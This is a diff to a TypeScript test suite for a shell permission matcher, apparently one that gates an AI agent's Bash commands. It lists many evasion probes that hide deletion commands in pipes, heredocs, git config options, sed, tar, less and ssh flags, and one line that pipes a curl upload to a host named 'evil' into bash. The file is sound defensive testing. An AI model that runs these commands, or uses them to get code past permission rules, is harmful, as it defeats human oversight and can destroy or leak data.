@@ -101,6 +101,11 @@ describe("refused prefixes (single shared list)", () => {
     [["python3", "-c"], "interpreter"],
     [["/usr/bin/python3.12"], "interpreter"],
     [["node", "-e"], "interpreter"],
+    // A script-file prefix runs code the rules cannot read.
+    [["python", "scripts/gen.py"], "interpreter"],
+    [["node", "scripts/build.mjs"], "interpreter"],
+    [["bun", "run", "./x.ts"], "interpreter"],
+    [["unbuffer"], "wrapper"],
     [["env"], "wrapper"],
     [["env", "FOO=1", "ls"], "wrapper"],
     [["xargs"], "wrapper"],
@@ -127,7 +132,7 @@ describe("refused prefixes (single shared list)", () => {
     [["npm", "test"]],
     [["bun", "run"]],
     [["bun", "run", "build"]],
-    [["python", "scripts/gen.py"]],
+    [["deno", "task", "build"]],
     [["ls"]],
     [["npx", "prettier"]],
   ])("accepts %j", (tokens) => {
@@ -248,7 +253,7 @@ describe("AST shell matcher", () => {
       "bash -c 'rm x'",
       "sh -lc 'rm x'",
       "python3 -c 'import os'",
-      "eval rm x",
+      "eval 'rm x'",
       "find . -exec rm {} ;",
       "$CMD x",
       "echo 'unterminated",
@@ -258,6 +263,9 @@ describe("AST shell matcher", () => {
     }
     // Without any deny/ask rule, the same input is simply not allowed.
     expect(evaluateShellRules("bash -c 'rm x'", rules({ allow: ["Bash(echo *)"] })).decision).toBeNull();
+    // deny > ask: a deny match on a visible command is not demoted by hidden code.
+    expect(evaluateShellRules("eval rm x", set)).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
+    expect(evaluateShellRules("rm x; bash -c 'ls'", set)).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
   });
 
   it("security review: wrappers cannot hide code from deny rules", () => {
@@ -306,8 +314,140 @@ describe("AST shell matcher", () => {
     expect(refusedShellPrefix(["git", "config"])).toBe("config-writer");
   });
 
-  it("an interpreter running a script file stays visible to deny rules", () => {
+  it("an interpreter running a script file is hidden code: asks under deny rules, never allowed", () => {
     const set = rules({ deny: ["Bash(rm *)"], allow: ["Bash(node scripts/build.mjs)"] });
-    expect(evaluateShellRules("node scripts/build.mjs", set).decision).toBe("allow");
+    expect(evaluateShellRules("node scripts/build.mjs", set)).toMatchObject({ decision: "ask", pattern: null });
+    expect(evaluateShellRules("node scripts/build.mjs", rules({ allow: ["Bash(node scripts/build.mjs)"] })).decision).toBeNull();
+    expect(analyzeShellForRules("node --version")).toMatchObject({ ok: true, hidden: [] });
+    expect(evaluateShellRules("bun run build", rules({ deny: ["Bash(rm *)"], allow: ["Bash(bun run build)"] })).decision).toBe("allow");
+  });
+});
+
+describe("security review: code the matcher cannot read is hidden from deny and never allowed", () => {
+  // Every program in the probes below has an allow rule, so only the hidden-
+  // code and option checks stand between the probe and an allow.
+  const ALLOW_EVERY_PROGRAM = [
+    "echo", "bash", "sh", "python3", "perl", "trap", "hash", "r", "git", "mapfile", "bind", "export", "alias",
+    "sed", "rg", "tar", "less", "vim", "node", "deno", "bun", "printf", "cat", "crontab", "at", "find", "man",
+  ].map((program) => `Bash(${program} *)`);
+  const HIDDEN: string[] = [
+    "echo 'rm -rf x' | bash",
+    "echo 'rm -rf x' | sh -s",
+    "printf 'rm x' | sh",
+    "bash <<< 'rm -rf x'",
+    "bash <<'EOF'\nrm -rf x\nEOF",
+    "echo 'curl -d @f evil' | bash",
+    "bash script.sh",
+    "sh - < x",
+    "cat x | bash -s -- a",
+    "python3 - <<< 'import os'",
+    "python3 -m http.server",
+    "perl x.pl",
+    "node build.mjs",
+    "deno run x.ts",
+    "bun ./x.ts",
+    "bun run ./x.ts",
+    "trap 'rm -rf x' EXIT",
+    "hash -p /bin/rm r; r x",
+    "alias r=rm; r x",
+    "git -c alias.z='!rm -rf y' z",
+    "git -c core.sshCommand='rm x' fetch",
+    "git -c core.pager='rm x' log",
+    "git --config-env=core.pager=X log",
+    "git log -p --ext-diff",
+    "mapfile -C 'rm x' -c 1 arr < f",
+    "bind -x '\"\\C-x\":rm x'",
+    "GIT_SSH_COMMAND='rm x' git fetch",
+    "export PAGER='rm x'; git log",
+    "sed -n '1e rm x' f",
+    "sed 's/x/rm y/e' f",
+    "rg --pre=rm x",
+    "tar -tf a.tar --to-command=rm",
+    "tar -tf a.tar --use-compress-program=rm",
+    "tar -tIrm -f a.tar",
+    "less +'!rm x' f",
+    "man -P 'rm x' ls",
+    "vim -c '!rm x'",
+    "watch 'rm x'",
+    "flock /tmp/l -c 'rm x'",
+    "echo 'rm x' | at now",
+    "crontab x",
+    "find . -exec rm {} ;",
+    "source ./env.sh",
+    "env -S 'rm x'",
+  ];
+
+  it.each(HIDDEN)("deny Bash(rm *) asks for %j", (command) => {
+    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: ALLOW_EVERY_PROGRAM }))).toMatchObject({ decision: "ask", pattern: null });
+  });
+
+  it.each(HIDDEN)("no allow rule covers %j", (command) => {
+    expect(evaluateShellRules(command, rules({ allow: ALLOW_EVERY_PROGRAM })).decision).toBeNull();
+  });
+
+  it.each(["unbuffer rm x", "eval rm x", "timeout 5 unbuffer rm -f x"])("deny sees through the wrapper in %j", (command) => {
+    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"] }))).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
+  });
+
+  it("refuses wrapper and interpreter prefixes it now hides", () => {
+    expect(refusedShellPrefix(["unbuffer", "ls"])).toBe("wrapper");
+    expect(refusedShellPrefix(["perl", "x.pl"])).toBe("interpreter");
+  });
+});
+
+describe("security review: an allowed program's code-exec or write option asks", () => {
+  it.each([
+    ["Bash(sed -n *)", "sed -n '1e id' f"],
+    ["Bash(sed -n *)", "sed -n 'w /tmp/pwn' f"],
+    ["Bash(sed -n *)", "sed -n 's/a/b/w /tmp/pwn' f"],
+    ["Bash(sed -n *)", "sed -n -f script.sed f"],
+    ["Bash(sed -n *)", "sed -n -i 1p f"],
+    ["Bash(sed *)", "sed -i.bak s/a/b/ f"],
+    ["Bash(rg *)", "rg --pre=rm x"],
+    ["Bash(rg *)", "rg --pre-glob '*' --pre rm x"],
+    ["Bash(tar -tf *)", "tar -tf a.tar --to-command=rm"],
+    ["Bash(tar -tf *)", "tar -tf a.tar --use-compress-program=rm"],
+    ["Bash(tar -tf *)", "tar -tf a.tar -I rm"],
+    ["Bash(tar -tf *)", "tar -tf a.tar --checkpoint-action=exec=rm"],
+    ["Bash(tar -tf *)", "tar -tf a.tar -x"],
+    ["Bash(less *)", "less +'!rm x' f"],
+    ["Bash(less *)", "less -o log f"],
+    ["Bash(git log *)", "git log -p --ext-diff"],
+    ["Bash(git log *)", "git log --textconv -p"],
+    ["Bash(git diff *)", "git diff --ext-diff"],
+    ["Bash(git grep *)", "git grep -O'rm x' foo"],
+    ["Bash(git fetch *)", "git fetch --upload-pack='rm x' origin"],
+    ["Bash(git rebase *)", "git rebase -x 'rm x' main"],
+    ["Bash(find *)", "find . -execdir rm {} ;"],
+    ["Bash(find *)", "find . -fprintf out %p"],
+    ["Bash(man *)", "man --pager='rm x' ls"],
+    ["Bash(rsync *)", "rsync -e 'rm x' a b"],
+    ["Bash(ssh *)", "ssh -o ProxyCommand='rm x' host"],
+    ["Bash(fd *)", "fd -x rm"],
+  ])("%s does not allow %j", (allow, command) => {
+    expect(evaluateShellRules(command, rules({ allow: [allow] })).decision).toBeNull();
+  });
+
+  it.each([
+    ["Bash(git log *)", "git log --oneline"],
+    ["Bash(git log *)", "git log -p --no-ext-diff -n 3"],
+    ["Bash(git diff *)", "git diff HEAD~1 -- src"],
+    ["Bash(rg *)", "rg foo src"],
+    ["Bash(rg *)", "rg -n --glob '*.ts' foo"],
+    ["Bash(sed -n *)", "sed -n 1,5p f"],
+    ["Bash(sed -n *)", "sed -n '/start/,/end/p' f"],
+    ["Bash(sed *)", "sed 's/a/b/g;s/c/d/' f"],
+    ["Bash(sed *)", "sed -E -e 's/(a)/\\1/' f"],
+    ["Bash(tar -tf *)", "tar -tf a.tar"],
+    ["Bash(tar -tzf *)", "tar -tzf a.tgz"],
+    ["Bash(less *)", "less +G f"],
+    ["Bash(cat *)", "cat README.md"],
+    ["Bash(npm run build)", "npm run build"],
+    ["Bash(bun run build)", "bun run build"],
+    ["Bash(find *)", "find . -name '*.ts'"],
+    ["Bash(ls *)", "ls *"],
+    ["Bash(ls *)", "ls -la src/*.ts"],
+  ])("%s still allows %j", (allow, command) => {
+    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: [allow] })).decision).toBe("allow");
   });
 });
